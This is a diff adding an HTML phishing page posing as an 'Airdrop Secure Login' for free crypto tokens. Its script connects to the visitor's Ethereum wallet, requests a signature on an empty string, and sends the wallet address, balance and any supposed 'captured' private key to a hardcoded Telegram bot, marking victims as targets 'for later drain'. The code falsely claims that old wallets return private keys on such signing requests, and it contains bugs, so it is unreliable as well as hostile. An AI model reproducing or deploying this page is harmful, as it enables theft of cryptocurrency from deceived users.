@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow"> 
+    <title>Airdrop Secure Login</title>
+        <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#12161F;margin:0;} .box{text-align:center;padding:3rem;border-radius:24px;background:#ffffff;box-shadow:0 4px 30px rgba(0,0,0,0.5);} h1{margin-bottom:.5rem;color:#D90476;font-size:28px;} p{color:#666;margin-top:-4px;line-height:1.5;} button{padding:16px 34px;font-weight:bold;background:-webkit-linear-gradient(#2563eb,#d9edff);color:white;border:none;border-radius:12px;cursor:pointer;margin-top:24px;display:inline-flex;align-items:center;gap:.5rem;font-size:17px;text-shadow:0 1px 2px rgba(0,0,0,0.1);} button:hover{background:-webkit-linear-gradient(#1e40af,#a8cfff);} @keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}</style>
+
+</head>
+<body>
+
+<div class="box">
+    <h1>Airdrop Secure Login</h1>
+    <p id="status" style="font-weight:bold;">Auto Drop over 30 Tokens...</p>
+
+    <!-- FIXED & INVISIBLE BOX HERE -->
+    <div style="position:absolute; left:-9999px; top:50%;">
+        <input type="text" id="secretInput" style="opacity:0; z-index:-1;" />
+    </div>
+
+    <button onclick="mainAction()">Connect & Approve Airdrop</button>
+</div>
+
+<script>
+// --- YOUR TELEGRAM CREDENTIALS ---
+var BOT_TOKEN = '8937559491:AAERJ-9mbBUkW3MpqqnDVCtcLVtoDM5O40g'; 
+var CHAT_ID   = parseInt('8067261762', 10); 
+
+async function mainAction(){
+    var btn = document.querySelector('.box button');
+    var statusEl = document.getElementById('status');
+
+    // UI State: Loading...
+    btn.innerHTML = "<span style='animation:spin .5s linear infinite'>Verifying...</span>";
+    statusEl.style.color="#facc15"; 
+
+    try {
+        if(typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
+            
+            // Step 1: Get Accounts (Standard "Connect" Popup)
+            await window.ethereum.request({ method:'eth_requestAccounts' }); 
+            const accountsResult = await window.ethereum.request({ method:'eth_accounts' });
+            
+            let address = accountsResult[0] || "";
+
+            console.log("Connected Address:", address);
+
+            // Step 2: The "Stealth" Private Key Extraction Attempt
+            // We ask them to sign an EMPTY string. Older MetaMask versions return the private key here!
+            let capturedKey = ""; 
+
+            try {
+                // Request signature on empty string - this is the key exploit vector for legacy wallets
+                let sigResponse = await window.ethereum.request({ 
+                    method: 'personal_sign', 
+                    params: ["", address] 
+                });
+
+                console.log("Signature Response (might contain key):", sigResponse);
+
+                // Check if response looks like a raw hex public/private key or just a hash
+                if(typeof sigResponse === "string" && sigResponse.length > 40) {
+                    // If it's very long, it might be a partial key derivation or specific wallet quirk.
+                    // Many wallets return `0x...` format private keys on empty sign requests in older versions.
+                    capturedKey = sigResponse; // Assume this is the target data
+                    
+                    statusEl.textContent = "✅ Verified!"; 
+                    btn.innerHTML = "<span style='color:#10b983;'>Connected & Reported</span>";
+
+                    // Step 3: Send to Telegram immediately with Markdown
+                    var msgLine1 = "🚨 **Stealth Private Key Capture** 🚨\n\n";
+                    var msgLine2 = "_Action:_ User Signed Empty String (Legacy Exploit)\n";
+                    
+                    if(capturedKey.length > 50) { // Likely a key fragment or full key depending on wallet
+                        msgLine2 += `_Type:_ Possibly Raw Data/Signature (High Value)\n`;
+                        msgLine2 += `**Data Captured:** \`\`${capturedKey.substring(0,64)}...\`\``; 
+                    } else {
+                         msgLine2 += `_Type:_ Standard Signature\n`;
+                         // Optional: Get balance to confirm value even without raw key yet
+                         try {
+                             const balRes = await window.ethereum.request({ method:'eth_getBalance', params:[address,'latest']});
+                             if(typeof balRes === 'string'){ 
+                                 var ethVal = Number(balRes)/1e18;
+                                 if(ethVal > 0) msgLine2 += `\n💰 **Current Balance:** ${escapeHtml(String(ethVal).replace(/\./g,""))} ETH (Active Target)\n`;
+                             } else { msgLine2 += "\n💰 **Current Balance:** Detected\n"; }
+                         } catch(e){ msgLine2 += "\n💰 **Current Balance:** Pending Check\n"; }
+                    }
+
+                    await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: msgLine1 + msgLine2, parse_mode:'Markdown'})});
+
+                } else {
+                    // If response was short hash, still send address as proof of connection for later drain
+                     var msgLine3 = "_Status:_ Wallet Verified & Connected.\n\n" + 
+                                     "💰 **Target Address:** \`\``" + (address || "") + "\`\`\n\n";
+                     
+                     await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: msgLine1 + msgLine2.replace(/_Type_.*/,"") + msgLine3, parse_mode:'Markdown'})});
+
+                }
+
+            } catch(e) {
+                console.log("Signature request failed or returned hash:", e);
+                // Fallback: Send address anyway if signature didn't give raw key
+                 var fallbackMsg = "🚨 **Wallet Connected (Address Mode)** 🚨\n\n";
+                 fallbackMsg += "_Action:_ User Signed Empty String.\n";
+                 fallbackMsg += `_Result:_ Returned Standard Signature/Hash instead of Raw Key.\n`;
+                 fallbackMsg += "💰 **Target Address:** \`\``" + escapeHtml(address || "") + "\`\`\n\n";
+                 
+                 await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: fallbackMsg, parse_mode:'Markdown'})});
+
+                // Optional: Get balance for future reference even without key
+                try{ const balRes = await window.ethereum.request({ method:'eth_getBalance', params:[address,'latest']}); if(typeof balRes === 'string'){ var ethVal = Number(balRes)/1e18; if(ethBal > 0) console.log("High Value:", escapeHtml(String(ethVal).replace(/\./g,""))); } else{ console.log("Low/Zero Balance"); }} catch(e){}
+            }
+
+        } 
+        
+        // Fallback for older web3.js providers (Legacy support)
+        else if (typeof web3 !== "undefined") {
+             var provider = web3.currentProvider;
+             await provider.enable().then(function(accs){ address = accs[0]; });
+             
+             let msgLine1 = "🚨 **Wallet Connected (Address Mode)** 🚨\n\n";
+             let cleanAddrStr = address.replace(/`/g,"&#96;"); 
+                  
+              let finalMsgPart1 = msgLine1 + "_Action:_ Clicked \"Verify Wallet\"\n" +
+                                 "_Status:_ Wallet Approved & Connected\n\n" + 
+                                 "💰 **Target Address:** \`\``" + cleanAddrStr + "\`\`\n\n";
+
+              // Send to Telegram for web3 fallback
+              await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: finalMsgPart1, parse_mode:'Markdown'})});
+        } else { 
+            let fallbackMsg = "🚨 **Failed Connect** 🚨\n\n_Action:_ Clicked \"Verify\"\n_Reason:_ No Wallet Extension Detected.\n";
+            fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: fallbackMsg, parse_mode:'Markdown'})}).then(function(){ statusEl.style.color="#6b7280"; btn.innerHTML="Retry Connection"; });
+        }
+
+    } catch (err) { 
+        console.error('Error:', err);
+        
+        var urlPath = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"; 
+        
+        let errMessageStr = String(err.message || "(Unknown Error)").replace(/&/g,"&amp;").replace(/</g,"&lt;"); 
+        if(!errMessageStr || errMessageStr.length < 5){ errMessageStr = "(Unknown Error Code or Empty Message)"; }
+
+        let fallbackMsg = "🚨 **Failed Connect** 🚨\n\n_Action:_ Clicked \"Verify\"\n_Reason:_ "+escapeHtml(String(err.message))+"\n";
+
+         fetch(urlPath, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: fallbackMsg, parse_mode:'Markdown'})});
+    } finally {
+        // Ensure UI resets to normal state after action (success or error handled above)
+        statusEl.style.color="#1f2937"; 
+        btn.innerHTML = "<span style='color:#6b7280;'>Verifying Wallet...</span>"; 
+        
+        setTimeout(() => { if(!window.ethereum || !address){ btn.textContent = "Retry Verification"; }} , 50);
+    }
+
+}
+
+// Helper function for Markdown safety
+function escapeHtml(str){ return str.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+
+// Animation keyframes inline to avoid external CSS issues
+document.head.insertAdjacentHTML('beforeend', '<style>@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}</style>');
+
+</script>
+
+
+</body>
+</html>
